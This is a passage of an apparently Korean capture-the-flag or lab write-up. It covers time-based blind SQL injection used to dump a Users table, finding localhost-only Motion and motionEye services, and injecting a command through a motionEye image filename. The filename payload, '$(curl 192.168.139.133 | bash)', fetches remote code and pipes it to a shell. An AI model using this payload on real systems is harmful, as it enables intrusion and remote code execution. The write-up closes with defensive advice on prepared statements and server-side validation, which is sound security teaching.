...
취약점이 확인되면 Users 테이블을 덤프한다. Time-based Blind SQLi 특성상 글자 하나씩 추출하기 때문에 시간이 소요된다.
...
![internal ports open](images/internal_ports_open.png)

로컬호스트에서만 열려있는 포트 중 주목할 것들:

| 포트 | 서비스 |
|------|--------|
| 7999 | Motion 4.7.1 (CCTV 모션 감지) |
| **8765** | **motionEye 0.43.1b4 (카메라 관리 UI)** |

```bash
curl -s http://127.0.0.1:7999   # Motion 4.7.1 Running [1] Camera
curl -s http://127.0.0.1:8765   # motionEye HTML 응답
```
...
```
$(curl 192.168.139.133 | bash).2025-11-08-01-11-50.jpg
...
![motioneye admin password grep](images/motioneye_admin_password_grep.png)
...
Blind SQL Injection은 결과가 화면에 직접 노출되지 않아 탐지가 어렵다. 응답 시간 차이를 이용하기 때문에 WAF나 IDS에서 잡히지 않는 경우가 많다. 항상 Prepared Statement(플레이스홀더 `?`)를 사용하고, 파라미터를 SQL 문자열에 직접 삽입하는 코드는 단 한 줄도 허용해서는 안 된다.

motionEye의 Client-side Validation Bypass는 웹 보안의 기본 원칙인 "서버사이드 검증"이 부재할 때 발생한다. 클라이언트 검증은 UX 편의를 위한 것이고, 보안은 반드시 서버에서 처리해야 한다. 파일명과 같이 쉘에서 처리되는 값은 특수문자를 화이트리스트 방식으로 제한해야 한다.
